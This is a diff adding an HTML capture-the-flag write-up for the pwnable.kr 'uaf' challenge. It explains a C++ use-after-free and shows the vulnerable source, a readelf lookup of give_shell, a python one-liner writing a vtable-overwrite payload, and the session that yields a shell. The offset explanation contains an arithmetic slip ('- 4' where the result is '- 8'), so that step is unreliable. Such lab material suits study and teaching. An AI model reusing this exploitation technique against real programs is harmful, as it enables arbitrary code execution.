@@ -1,0 +1,161 @@
+<head>
+    <title>pwnable.kr - uaf writeup</title>
+</head>
+
+<body>
+    <p style="display: block; white-space: pre-wrap;">
+    So let's start by looking at the source code:
+
+    <code style="display: block; white-space: pre-wrap;">
+        #include &lt;fcntl.h&gt;
+        #include &lt;iostream&gt;
+        #include &lt;cstring&gt;
+        #include &lt;cstdlib&gt;
+        #include &lt;unistd.h&gt;
+        using namespace std;
+
+        class Human{
+        private:
+        virtual void give_shell(){
+        system("/bin/sh");
+        }
+        protected:
+        int age;
+        string name;
+        public:
+        virtual void introduce(){
+        cout &lt;&lt; "My name is " &lt;&lt; name &lt;&lt; endl;
+        cout &lt;&lt; "I am " &lt;&lt; age &lt;&lt; " years old" &lt;&lt; endl;
+        }
+        };
+
+        class Man: public Human{
+        public:
+        Man(string name, int age){
+        this-&gt;name = name;
+        this-&gt;age = age;
+        }
+        virtual void introduce(){
+        Human::introduce();
+        cout &lt;&lt; "I am a nice guy!" &lt;&lt; endl;
+        }
+        };
+
+        class Woman: public Human{
+        public:
+        Woman(string name, int age){
+        this-&gt;name = name;
+        this-&gt;age = age;
+        }
+        virtual void introduce(){
+        Human::introduce();
+        cout &lt;&lt; "I am a cute girl!" &lt;&lt; endl;
+        }
+        };
+
+        int main(int argc, char* argv[]){
+        Human* m = new Man("Jack", 25);
+        Human* w = new Woman("Jill", 21);
+
+        size_t len;
+        char* data;
+        unsigned int op;
+        while(1){
+        cout &lt;&lt; "1. use\n2. after\n3. free\n";
+        cin &gt;&gt; op;
+
+        switch(op){
+        case 1:
+        m-&gt;introduce();
+        w-&gt;introduce();
+        break;
+        case 2:
+        len = atoi(argv[1]);
+        data = new char[len];
+        read(open(argv[2], O_RDONLY), data, len);
+        cout &lt;&lt; "your data is allocated" &lt;&lt; endl;
+        break;
+        case 3:
+        delete m;
+        delete w;
+        break;
+        default:
+        break;
+        }
+        }
+
+        return 0;	
+        }
+    </code>
+
+    So we have two classes. man and woman. those are the same except for the greeting message. So we create two Human pointers: 
+    A man named "Jack" who is 25 years old and a woman named "Jill" who is 21 years old. Then, we declare some other variables and start a while true loop.
+    If we enter 1, we introduce Jack and Jill. if we enter 2, we set length to argv[1], set data to a buffer the size of len and read from the argv[2] fd to data buffer len bytes.
+    On case 3, we delete Jack and Jill :(. The vulnerability here is a Use After Free (UAF) vuln. we free m and w, but then we can allocate them again. This is dangerous because the dangling pointer can point to the new data
+    which allows for code substitution. Let's try to find the give_shell function:
+
+    <code style="display: block; white-space: pre-wrap;">
+        uaf@pwnable:~$ readelf -a ./uaf | grep give
+        85: 000000000040117a    24 FUNC    WEAK   DEFAULT   13 _ZN5Human10give_shellEv
+    </code>
+
+    We only need 24 bytes to save the vtable, the name and the age. So let's find man's vtable:
+
+    <code style="display: block; white-space: pre-wrap;">
+        we break here:
+
+        0x0000000000400f18 &lt;+84&gt;:	mov    %rbx,-0x38(%rbp)
+
+        rax:
+
+        rax            0x1c6fc50
+
+        This points to 0x00401570 which is man's vtable. If we write something to change introduce to give_shell, when we call introduce the program will call *vtable + offset. if offset + 4 = *vtable + 0*give_shell then 
+        offset = vtable - 4 = 0x00401570 - 4 = 0x401568. let's do it:
+
+        <code style="display: block; white-space: pre-wrap;">
+            uaf@pwnable:~$ python -c 'print "\x68\x15\x40\x00\x00\x00\x00\x00"' &gt; /tmp/pay
+
+            uaf@pwnable:~$ ./uaf 8 /tmp/pay
+            1. use
+            2. after
+            3. free
+            1
+            My name is Jack
+            I am 25 years old
+            I am a nice guy!
+            My name is Jill
+            I am 21 years old
+            I am a cute girl!
+            1. use
+            2. after
+            3. free
+            3
+            1. use
+            2. after
+            3. free
+            2
+            your data is allocated
+            1. use
+            2. after
+            3. free
+            2
+            your data is allocated
+            1. use
+            2. after
+            3. free
+            1
+            $
+            $ ls
+            flag  uaf  uaf.cpp
+            $ cat flag
+            **************************
+        </code>
+
+        Nice we solved it!
+
+        EOF
+    </p>
+</body>
+
+
